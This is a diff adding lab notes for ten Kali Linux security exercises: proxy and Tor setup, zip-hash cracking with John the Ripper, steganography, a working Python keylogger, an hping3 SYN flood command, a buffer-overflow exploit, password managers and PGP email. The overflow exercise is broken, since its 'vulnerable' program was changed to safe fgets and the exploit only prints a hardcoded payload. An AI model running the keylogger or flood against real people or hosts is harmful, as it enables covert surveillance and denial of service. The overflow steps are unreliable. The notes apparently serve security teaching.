@@ -1,0 +1,192 @@
+Program 1 Proxy Server 
+Open the terminal in your Kali Linux system.
+sudo apt-get update 
+sudo apt-get install squid 
+sudo nano /etc/squid/squid.conf
+inside file paste
+acl localnet src 192.168.0.0/16
+http_access allow localnet
+save(ctrl+o)(ctrl+x)
+sudo systemctl restart squid 
+sudo apt-get install tor 
+sudo service tor start 
+torbrowser-launcher
+it will automatically start downloding
+
+
+
+Program 2 
+Password Cracking o Demonstrate how password cracking works using a tool like John the Ripper.
+sudo apt-get install -y build-essential libssl-dev zlib1g-dev yasm libgmp-dev libpcap-dev libnss3-dev libkrb5-dev pkg-config
+git clone https://github.com/magnumripper/JohnTheRipper.git
+cd JohnTheRipper/src
+echo "myworld" > example.txt
+zip --password mypassword protected.zip example.txt
+zip2john protected.zip>hash.txt
+john hash.txt
+
+
+
+Program 3: 
+Steganography: (this should be done in same folder where the image and secret.txt are located .open terminal inside folder)
+sudo apt-get update
+sudo apt-get install steghide
+nano secret.txt
+(inside type 123)(ctrl+o,ctrl+x)
+steghide embed -cf img.jpeg -ef secret.txt
+steghide extract -sf img.jpeg
+cat secret.txt
+
+
+
+program 4
+keylogger
+
+sudo apt update
+sudo apt install python3-pynput
+nano keylogger.py
+
+from pynput.keyboard import Key, Listener
+
+def on_press(key):
+    with open("log.txt", 'a') as f:
+        f.write(str(key) + '\n')
+
+# Start the keylogger
+with Listener(on_press=on_press) as listener:
+    listener.join()
+
+(ctrl+o,ctrl+x)
+sudo apt install python3-venv python3-pip
+python3 -m venv myenv
+source myenv/bin/activate
+pip install pynput
+python keylogger.py
+(type anything ctrl+c to exit)
+cat log.txt
+
+
+Program 5 :
+hping
+
+mdkir cyber
+cd cyber
+nano text.txt
+(type anything and save )
+sudo apt-get update
+sudo apt-get install hping3 
+python -- version
+if version is 2 then:
+python -m SimpleHTTPServer 80
+if the version is 3:
+python3 -m http.server 80
+copy the link and paste in browser open the  text.txt in browser
+sudo hping3 -S --flood -V -p 80 <target_IP>
+target ip which  is showing in the terminal
+go to another terminal tab and type
+sudo tcpdump -i any port 80
+
+
+
+
+
+
+program 6:
+Buffer Overflow:
+
+nano vuln.c
+
+#include <stdio.h> 
+#include <string.h> 
+
+void shell() { 
+    printf("You have successfully executed the shell function!\n"); 
+} 
+
+void vulnerable_function() { 
+    char buffer[64]; 
+    printf("Enter some text: "); 
+    
+    // Replace gets() with fgets() for safety
+    if (fgets(buffer, sizeof(buffer), stdin) != NULL) {
+        // Remove newline character if present
+        buffer[strcspn(buffer, "\n")] = '\0';
+        printf("You entered: %s\n", buffer);
+    }
+} 
+
+int main() { 
+    vulnerable_function(); 
+    return 0; 
+}
+
+gcc -o vuln vuln.c -fno-stack-protector -z execstack -no-pie
+objdump -d vuln | grep shell
+(This command will display the address of the shell function. Note this address (e.g., 0x080484b6).)
+nano exploit.py 
+import struct 
+
+# Address of the shell function 
+shell_address = 0x080484b6 # Overwrite return address with shell function address
+
+# Create the payload 
+payload = b"A" * 64  # Fill the buffer
+payload += b"B" * 4   # Overwrite saved EBP (if needed, depends on stack layout)
+payload += struct.pack("<I", shell_address)  # Overwrite return address
+
+# Print the payload 
+print(payload)
+
+
+ctrl+o,ctrl+x
+
+./vuln
+
+Open another terminal and run the Python script to generate the exploit payload
+
+python3 exploit.py
+
+
+program 7:
+KeePassX:
+
+sudo apt update
+sudo apt install keepassx
+keepassxc
+create the database add the entries
+
+
+program 8:
+Installing Tor on Kali Linux involves a few steps.
+sudo apt update
+sudo apt install tor
+torbrowser-launcher
+
+
+
+Program 9: 
+Step 1: Install Mozilla Thunderbird :
+sudo apt update
+sudo apt install thunderbird
+sudo apt install gnupg
+thunderbird
+
+
+program 10:
+sudo apt update 
+sudo apt install thunderbird
+thunderbird
+Step 2: Create Two Email Accounts
+ You can use:
+Two Gmail accounts (enable "Less Secure Apps" or App Passwords if needed).
+Or use temporary email services (e.g., Temp-Mail.org) for testing.
+Step 3: Generate PGP Keys
+For each account, go to:
+Account Settings → End-to-End Encryption → Add Key.
+Follow the wizard to generate a key pair.
+Step 4: Export/Import Public Keys
+Use Tools → OpenPGP Key Manager to export/import .asc public key files.
+Step 5: Send Encrypted Emails
+Compose an email → click the Lock icon (encrypt) and Pen icon (sign).
+ 
+
